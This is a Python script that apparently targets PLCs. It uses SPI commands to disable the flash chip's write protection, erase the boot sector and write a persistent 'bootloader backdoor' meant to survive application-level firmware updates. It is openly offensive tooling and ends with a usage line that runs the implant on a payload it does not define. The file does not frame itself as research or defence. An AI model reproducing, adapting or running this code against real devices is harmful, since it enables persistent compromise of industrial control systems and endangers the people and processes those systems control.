# flash_protection_bypass.py - Bypass flash write protection
# Some PLCs use SPI flash status register to protect boot sectors

import spidev

class FlashProtectionBypass:
    def __init__(self):
        self.spi = spidev.SpiDev()
        self.spi.open(0, 0)

    def read_status_register(self):
        """Read flash protection status"""
        cmd = [0x05, 0x00]  # RDSR command
        result = self.spi.xfer2(cmd)
        return result[1]

    def disable_write_protection(self):
        """
        Clear Status Register Protection (SRP) and Block Protection (BP) bits
        This allows writing to protected boot sectors
        """
        # Enable write operations
        self.spi.xfer2([0x06])  # WREN (Write Enable)

        # Write Status Register (clear protection bits)
        # SR format: [SRP, 0, 0, BP2, BP1, BP0, WEL, WIP]
        # Set to 0x00 (no protection)
        self.spi.xfer2([0x01, 0x00])  # WRSR command

        # Verify
        status = self.read_status_register()
        if status == 0x00:
            print("[+] Write protection disabled")
            return True
        else:
            print(f"[-] Protection still active: 0x{status:02x}")
            return False

    def write_bootloader_backdoor(self, backdoor_code):
        """
        Write backdoor to bootloader section (sector 0)
        Survives any application-level firmware update
        """
        if not self.disable_write_protection():
            return False

        # Erase sector 0
        self.spi.xfer2([0x06])  # WREN
        self.spi.xfer2([0x20, 0x00, 0x00, 0x00])  # Sector erase

        # Wait for erase completion
        while self.read_status_register() & 0x01:
            pass

        # Write backdoor to address 0x0000
        self.spi.xfer2([0x06])  # WREN
        cmd = [0x02, 0x00, 0x00, 0x00]  # Page Program
        cmd.extend(list(backdoor_code))
        self.spi.xfer2(cmd)

        print("[+] Bootloader backdoor written")

# Usage (requires physical access or compromised BMC)
bypass = FlashProtectionBypass()
bypass.write_bootloader_backdoor(bootloader_payload)
